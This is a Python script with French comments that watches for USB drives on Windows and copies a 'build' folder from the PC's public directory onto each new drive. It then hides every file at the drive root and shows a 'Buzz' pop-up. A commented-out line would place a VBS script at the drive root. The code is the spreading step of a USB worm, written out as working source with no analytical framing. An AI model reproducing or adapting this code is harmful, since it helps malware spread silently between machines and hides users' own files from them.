from sys import argv
from datetime import datetime
from tkinter import messagebox
import os
import time
import ports
import tkinter

startTime = time.time()
script = argv
name = str(script[0])

USBList = []

global root
root = tkinter.Tk()
root.withdraw()

def copy_to_key(dst):
    '''
    Copie du PC à la clé USB
    '''
    if os.name == 'nt':
        os.mkdir(dst + '\\build')
        os.system("robocopy /S C:\\Users\\Public\\build " + dst + "\\build")
        os.system("attrib +h " + dst + "\\*  /d")
        #os.system("copy C:\\Users\\Public\\build " + dst + "\\build")
        #os.system("move " + dst + "\\build\\script.vbs " + dst)
        messagebox.showinfo("Buzz", "Copié vers " + dst)

def USBDetect():
	'''
	Détection de clés USB
	'''
	if os.name == 'nt':
		USBDir = ports.get_usb_devices()
	lencount = len(USBDir)
	lencount -= 1

	while lencount >= 0:
		time.sleep(0.5)
		try:
			if os.path.exists(USBDir[lencount]):
				if USBDir[lencount] not in USBList:
					if not os.path.exists(USBDir[lencount] + "\\build"):
						USBList.append(USBDir[lencount])
						copy_to_key(USBDir[lencount])
				lencount -= 1
			else:
				lencount -= 1
		except IOError:
			pass

if __name__ == '__main__':
    while(1):
        USBDetect()